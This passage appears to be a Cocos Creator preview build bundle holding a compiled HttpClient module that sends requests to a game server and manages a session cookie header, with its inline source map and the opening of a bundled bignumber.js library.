gICAgICAgIH0pO1xyXG4gICAgfVxyXG59XHJcblxyXG5cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/http/HttpClient.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '0d6301Fqh9AaZzazi2zgka+', 'HttpClient');
// framework/http/HttpClient.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.HttpClient = void 0;
var HttpOption_1 = require("./HttpOption");
var NetworkConfig_1 = require("../../script/app/config/NetworkConfig");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var cookieMap = new Map();
/** http默认配置 */
var httpOption = new HttpOption_1.HttpOption();
httpOption.host = NetworkConfig_1.NetworkConfig.host;
httpOption.port = 443;
// httpOption.timeout = 3*6000;
httpOption.timeout = 1;
httpOption.cookieKey = "vertx-cookie";
// 不支持FormData的浏览器的处理
if (typeof FormData == "undefined") {
    httpOption.headers.set("content-type", "application/x-www-form-urlencoded");
}
/**
 * 错误处理:
 * error.status 0表示网络异常，1表示网络超时  >=200表示http请求状态码
 * */
var HttpClient = /** @class */ (function () {
    function HttpClient() {
    }
    HttpClient.deleteCookie = function (cookieKey) {
        cookieMap.delete(cookieKey);
    };
    HttpClient.get = function (protocol, httpOption) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, this.send("GET", protocol, httpOption)];
            });
        });
    };
    HttpClient.post = function (protocol, httpOption) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, this.send("POST", protocol, httpOption)];
            });
        });
    };
    HttpClient.send = function (method, protocol, httpOption) {
        return __awaiter(this, void 0, void 0, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var option, xmlrequest, url, val, res;
                        return __generator(this, function (_a) {
                            option = httpOption || HttpClient.defaultHttpOption;
                            xmlrequest = new XMLHttpRequest();
                            xmlrequest.timeout = option.timeout;
                            xmlrequest.ontimeout = function (e) {
                                console.log(e, "ontimeout...");
                                reject({
                                    message: "网络超时",
                                    status: 1,
                                    protocol: protocol
                                });
                            };
                            xmlrequest.onerror = function (err) {
                                console.log(err, "onerror...");
                                if (typeof wx != "undefined" && err.indexOf('timeout') !== -1) {
                                    reject({
                                        message: "网络超时",
                                        status: 1,
                                        protocol: protocol
                                    });
                                }
                                else {
                                    reject({
                                        message: "网络错误",
                                        status: 1,
                                        protocol: protocol
                                    });
                                }
                            };
                            xmlrequest.onloadend = function (e) {
                                if (xmlrequest.readyState == 4) {
                                    if (option.cookieKey && !cookieMap.get(option.cookieKey)) {
                                        cookieMap.set(option.cookieKey, xmlrequest.getResponseHeader(option.cookieKey));
                                    }
                                    if (xmlrequest.status === 200) {
                                        try {
                                            protocol.decode(xmlrequest.responseText);
                                            resolve(protocol.getResponseData());
                                        }
                                        catch (e) {
                                            reject({
                                                message: "服务器状态出错==>" + protocol.getResponseMessage(),
                                                status: 200,
                                                protocol: protocol
                                            });
                                        }
                                    }
                                    else {
                                        if (xmlrequest.status == 0 && e.timeStamp && e.timeStamp > xmlrequest.timeout) {
                                            /** 超时在超时回调里处理 */
                                            return;
                                        }
                                        var msg = void 0;
                                        if (xmlrequest.status === 0) {
                                            msg = "网络异常";
                                        }
                                        else {
                                            msg = "服务器异常";
                                        }
                                        reject({
                                            message: msg,
                                            status: xmlrequest.status,
                                            protocol: protocol
                                        });
                                    }
                                }
                            };
                            url = option.host;
                            if (option.port != 80 && option.port != 443) {
                                url += ":" + option.port;
                            }
                            url += protocol.uri;
                            xmlrequest.open(method, url);
                            if (option.cookieKey) {
                                val = cookieMap.get(option.cookieKey);
                                if (val != null) {
                                    xmlrequest.setRequestHeader(option.cookieKey, val);
                                }
                            }
                            option.headers.forEach(function (value, key) { return xmlrequest.setRequestHeader(key, value); });
                            res = protocol.encode();
                            xmlrequest.send(res);
                            return [2 /*return*/];
                        });
                    }); })];
            });
        });
    };
    HttpClient.defaultHttpOption = httpOption;
    return HttpClient;
}());
exports.HttpClient = HttpClient;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaHR0cC9IdHRwQ2xpZW50LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOzs7QUFJbkcsMkNBQXdDO0FBRXhDLHVFQUFvRTtBQUU5RCxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUUxQyxJQUFJLFNBQVMsR0FBRyxJQUFJLEdBQUcsRUFBZSxDQUFDO0FBR3ZDLGVBQWU7QUFDZixJQUFJLFVBQVUsR0FBRyxJQUFJLHVCQUFVLEVBQUUsQ0FBQztBQUNsQyxVQUFVLENBQUMsSUFBSSxHQUFHLDZCQUFhLENBQUMsSUFBSSxDQUFDO0FBQ3JDLFVBQVUsQ0FBQyxJQUFJLEdBQUcsR0FBRyxDQUFDO0FBQ3RCLCtCQUErQjtBQUMvQixVQUFVLENBQUMsT0FBTyxHQUFHLENBQUMsQ0FBQztBQUN2QixVQUFVLENBQUMsU0FBUyxHQUFHLGNBQWMsQ0FBQztBQUN0QyxxQkFBcUI7QUFDckIsSUFBRyxPQUFPLFFBQVEsSUFBSSxXQUFXLEVBQUU7SUFDL0IsVUFBVSxDQUFDLE9BQU8sQ0FBQyxHQUFHLENBQUMsY0FBYyxFQUFFLG1DQUFtQyxDQUFDLENBQUM7Q0FDL0U7QUFFRDs7O0tBR0s7QUFDTDtJQUFBO0lBdUdBLENBQUM7SUFuR1UsdUJBQVksR0FBbkIsVUFBb0IsU0FBZ0I7UUFDaEMsU0FBUyxDQUFDLE1BQU0sQ0FBQyxTQUFTLENBQUMsQ0FBQztJQUNoQyxDQUFDO0lBRVksY0FBRyxHQUFoQixVQUFpQixRQUFxQixFQUFFLFVBQXNCOzs7Z0JBQzFELHNCQUFPLElBQUksQ0FBQyxJQUFJLENBQUMsS0FBSyxFQUFFLFFBQVEsRUFB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QUM7Q0F2R0QsQUF1R0MsSUFBQTtBQXZHWSxnQ0FBVSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuXHJcblxyXG5pbXBvcnQge0h0dHBPcHRpb259IGZyb20gXCIuL0h0dHBPcHRpb25cIjtcclxuaW1wb3J0IEh0dHBQcm90b2NvbCBmcm9tIFwiLi9IdHRwUHJvdG9jb2xcIjtcclxuaW1wb3J0IHtOZXR3b3JrQ29uZmlnfSBmcm9tIFwiLi4vLi4vc2NyaXB0L2FwcC9jb25maWcvTmV0d29ya0NvbmZpZ1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5sZXQgY29va2llTWFwID0gbmV3IE1hcDxzdHJpbmcsIGFueT4oKTtcclxuXHJcblxyXG4vKiogaHR0cOm7mOiupOmFjee9riAqL1xyXG5sZXQgaHR0cE9wdGlvbiA9IG5ldyBIdHRwT3B0aW9uKCk7XHJcbmh0dHBPcHRpb24uaG9zdCA9IE5ldHdvcmtDb25maWcuaG9zdDtcclxuaHR0cE9wdGlvbi5wb3J0ID0gNDQzO1xyXG4vLyBodHRwT3B0aW9uLnRpbWVvdXQgPSAzKjYwMDA7XHJcbmh0dHBPcHRpb24udGltZW91dCA9IDE7XHJcbmh0dHBPcHRpb24uY29va2llS2V5ID0gXCJ2ZXJ0eC1jb29raWVcIjtcclxuLy8g5LiN5pSv5oyBRm9ybURhdGHnmoTmtY/op4jlmajnmoTlpITnkIZcclxuaWYodHlwZW9mIEZvcm1EYXRhID09IFwidW5kZWZpbmVkXCIpIHtcclxuICAgIGh0dHBPcHRpb24uaGVhZGVycy5zZXQoXCJjb250ZW50LXR5cGVcIiwgXCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcIik7XHJcbn1cclxuXHJcbi8qKlxyXG4gKiDplJnor6/lpITnkIY6XHJcbiAqIGVycm9yLnN0YXR1cyAw6KGo56S6572R57uc5byC5bi477yMMeihqOekuue9kee7nOi2heaXtiAgPj0yMDDooajnpLpodHRw6K+35rGC54q25oCB56CBXHJcbiAqICovXHJcbmV4cG9ydCBjbGFzcyBIdHRwQ2xpZW50e1xyXG5cclxuICAgIHN0YXRpYyBkZWZhdWx0SHR0cE9wdGlvbjpIdHRwT3B0aW9uID0gaHR0cE9wdGlvbjtcclxuXHJcbiAgICBzdGF0aWMgZGVsZXRlQ29va2llKGNvb2tpZUtleTpzdHJpbmcpe1xyXG4gICAgICAgIGNvb2tpZU1hcC5kZWxldGUoY29va2llS2V5KTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgYXN5bmMgZ2V0KHByb3RvY29sOkh0dHBQcm90b2NvbCwgaHR0cE9wdGlvbj86SHR0cE9wdGlvbil7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuc2VuZChcIkdFVFwiLCBwcm90b2NvbCwgaHR0cE9wdGlvbik7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGFzeW5jIHBvc3QocHJvdG9jb2w6SHR0cFByb3RvY29sLCBodHRwT3B0aW9uPzpIdHRwT3B0aW9uKXtcclxuICAgICAgICByZXR1cm4gdGhpcy5zZW5kKFwiUE9TVFwiLCBwcm90b2NvbCwgaHR0cE9wdGlvbik7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHN0YXRpYyBhc3luYyBzZW5kKG1ldGhvZDpzdHJpbmcsIHByb3RvY29sOkh0dHBQcm90b2NvbCwgaHR0cE9wdGlvbj86SHR0cE9wdGlvbil7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgb3B0aW9uID0gaHR0cE9wdGlvbiB8fCBIdHRwQ2xpZW50LmRlZmF1bHRIdHRwT3B0aW9uO1xyXG4gICAgICAgICAgICBsZXQgeG1scmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO1xyXG4gICAgICAgICAgICB4bWxyZXF1ZXN0LnRpbWVvdXQgPSBvcHRpb24udGltZW91dDtcclxuICAgICAgICAgICAgeG1scmVxdWVzdC5vbnRpbWVvdXQgPSBmdW5jdGlvbiAoZSkge1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coZSwgXCJvbnRpbWVvdXQuLi5cIik7XHJcbiAgICAgICAgICAgICAgICByZWplY3Qoe1xyXG4gICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U6XCLnvZHnu5zotoXml7ZcIixcclxuICAgICAgICAgICAgICAgICAgICBzdGF0dXM6MSxcclxuICAgICAgICAgICAgICAgICAgICBwcm90b2NvbDpwcm90b2NvbFxyXG4gICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIH07XHJcblxyXG4gICAgICAgICAgICB4bWxyZXF1ZXN0Lm9uZXJyb3IgPSBmdW5jdGlvbihlcnIpe1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coZXJyLCBcIm9uZXJyb3IuLi5cIik7XHJcbiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIHd4ICE9IFwidW5kZWZpbmVkXCIgJiYgKDxzdHJpbmc+ZXJyKS5pbmRleE9mKCd0aW1lb3V0JykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgcmVqZWN0KHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTpcIue9kee7nOi2heaXtlwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXM6MSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgcHJvdG9jb2w6cHJvdG9jb2xcclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICByZWplY3Qoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlOlwi572R57uc6ZSZ6K+vXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1czoxLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBwcm90b2NvbDpwcm90b2NvbFxyXG4gICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9O1xyXG5cclxuICAgICAgICAgICAgeG1scmVxdWVzdC5vbmxvYWRlbmQgPSBmdW5jdGlvbiAoZSkge1xyXG4gICAgICAgICAgICAgICAgaWYgKHhtbHJlcXVlc3QucmVhZHlTdGF0ZSA9PSA0KXtcclxuICAgICAgICAgICAgICAgICAgICBpZiAob3B0aW9uLmNvb2tpZUtleSAmJiAhY29va2llTWFwLmdldChvcHRpb24uY29va2llS2V5KSl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZU1hcC5zZXQob3B0aW9uLmNvb2tpZUtleSwgeG1scmVxdWVzdC5nZXRSZXNwb25zZUhlYWRlcihvcHRpb24uY29va2llS2V5KSlcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKHhtbHJlcXVlc3Quc3RhdHVzID09PSAyMDApIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb3RvY29sLmRlY29kZSh4bWxyZXF1ZXN0LnJlc3BvbnNlVGV4dCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNvbHZlKHByb3RvY29sLmdldFJlc3BvbnNlRGF0YSgpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfWNhdGNoIChlKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWplY3Qoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U6XCLmnI3liqHlmajnirbmgIHlh7rplJk9PT5cIitwcm90b2NvbC5nZXRSZXNwb25zZU1lc3NhZ2UoKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXM6MjAwLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb3RvY29sOnByb3RvY29sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHhtbHJlcXVlc3Quc3RhdHVzID09IDAgJiYgZS50aW1lU3RhbXAgJiYgZS50aW1lU3RhbXAgPiB4bWxyZXF1ZXN0LnRpbWVvdXQpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgLyoqIOi2heaXtuWcqOi2heaXtuWbnuiwg+mHjOWkhOeQhiAqL1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBtc2c7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh4bWxyZXF1ZXN0LnN0YXR1cyA9PT0gMCl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtc2cgPSBcIue9kee7nOW8guW4uFwiO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbXNnID0gXCLmnI3liqHlmajlvILluLhcIjtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZWplY3Qoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTptc2csXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXM6eG1scmVxdWVzdC5zdGF0dXMsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm90b2NvbDpwcm90b2NvbFxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH07XHJcblxyXG4gICAgICAgICAgICBsZXQgdXJsID0gb3B0aW9uLmhvc3Q7XHJcbiAgICAgICAgICAgIGlmIChvcHRpb24ucG9ydCAhPSA4MCAmJiBvcHRpb24ucG9ydCAhPSA0NDMpe1xyXG4gICAgICAgICAgICAgICAgdXJsICs9IGA6JHtvcHRpb24ucG9ydH1gO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHVybCArPSBwcm90b2NvbC51cmk7XHJcbiAgICAgICAgICAgIHhtbHJlcXVlc3Qub3BlbihtZXRob2QsdXJsKTtcclxuXHJcbiAgICAgICAgICAgIGlmIChvcHRpb24uY29va2llS2V5KXtcclxuICAgICAgICAgICAgICAgIGxldCB2YWwgPSBjb29raWVNYXAuZ2V0KG9wdGlvbi5jb29raWVLZXkpO1xyXG4gICAgICAgICAgICAgICAgaWYgKHZhbCAhPSBudWxsKXtcclxuICAgICAgICAgICAgICAgICAgICB4bWxyZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIob3B0aW9uLmNvb2tpZUtleSwgdmFsKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgb3B0aW9uLmhlYWRlcnMuZm9yRWFjaCgodmFsdWUsIGtleSkgPT4geG1scmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKGtleSwgdmFsdWUpKTtcclxuICAgICAgICAgICAgbGV0IHJlcyA9IHByb3RvY29sLmVuY29kZSgpO1xyXG4gICAgICAgICAgICB4bWxyZXF1ZXN0LnNlbmQocmVzKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxufVxyXG5cclxuXHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/bigNumber.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '02e4aFqystFf7DVaHnZYH68', 'bigNumber');
// framework/extend/bigNumber.js

"use strict";

;

(function (globalObject) {
  'use strict';
  /*
   *      bignumber.js v7.2.1
   *      A JavaScript library for arbitrary-precision arithmetic.
   *      https://github.com/MikeMcl/bignumber.js
   *      Copyright (c) 2018 Michael Mclaughlin <M8ch88l@gmail.com>
   *      MIT Licensed.
   *
   *      BigNumber.prototype methods     |  BigNumber methods
   *                                      |
   *      absoluteValue            abs    |  clone
   *      comparedTo                      |  config               set
   *      decimalPlaces            dp     |      DECIMAL_PLACES
   *      dividedBy                div    |      ROUNDING_MODE
   *      dividedToIntegerBy       idiv   |      EXPONENTIAL_AT
   *      exponentiatedBy          pow    |      RANGE
